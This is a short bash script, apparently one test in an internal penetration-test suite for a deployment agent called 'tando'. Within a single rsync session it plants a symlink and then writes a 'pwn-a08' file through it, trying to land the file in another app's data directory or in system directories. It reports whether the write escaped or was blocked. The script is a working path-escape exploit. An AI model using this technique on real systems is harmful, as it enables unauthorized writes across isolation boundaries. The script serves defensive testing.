#!/bin/bash
# A08 (threat 2): F3 in ONE rsync session (the gate drops escaping symlinks only before and after a
# receive): the file list carries r -> <target> and then r/<file>, written through the link by the same
# receiver. Targets: alpha's shared/ (app data), bravo's shared/data via a relative link, /run/user, /dev/shm.
. "$(dirname "$0")/lib.sh"
srv 'cat > ~/a08.sh' <<'R'
set -u
K() { ssh -F /dev/null -i ~/ka -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR tando-d-alpha@127.0.0.1 "$@"; }
G=/opt/tando/bin/tando-agent
sudo $G unlock alpha > /dev/null 2>&1
tok=$(K "sudo -n $G begin alpha x" | sed -n "s/^token=//p"); echo "lease: ${tok:-none}"
for t in /opt/tando/apps/alpha/shared ../../bravo/shared/data /run/user/$(id -u tando-d-alpha) /dev/shm /var/tmp; do
  rm -rf ~/s1 ~/s2; mkdir -p ~/s1 ~/s2/r; ln -s "$t" ~/s1/r; echo pwned > ~/s2/r/pwn-a08
  SEDX='s/ -([a-zA-Z]*)R([a-zA-Z.]*)/ -\1\2/; s/ --no-implied-dirs//' \
    rsync -rlR --no-implied-dirs -e ~/kssh ~/s1/./r ~/s2/./r/pwn-a08 x:/opt/tando/apps/alpha/incoming/ 2>&1 | grep -vE '^remote:|^default_perms' | head -2
  echo "  target $t: $(sudo find / -xdev -name pwn-a08 -newer ~/s2/r 2>/dev/null | grep -v "^$HOME" | head -3 | tr '\n' ' ')"
done
echo "$tok" | K "sudo -n $G end alpha"
R
out=$(srv 'bash ~/a08.sh' 2>&1); echo "$out"
echo "$out" | grep -E 'target .*: /' && succeeded "a write landed outside incoming/"
blocked "no write outside incoming/"
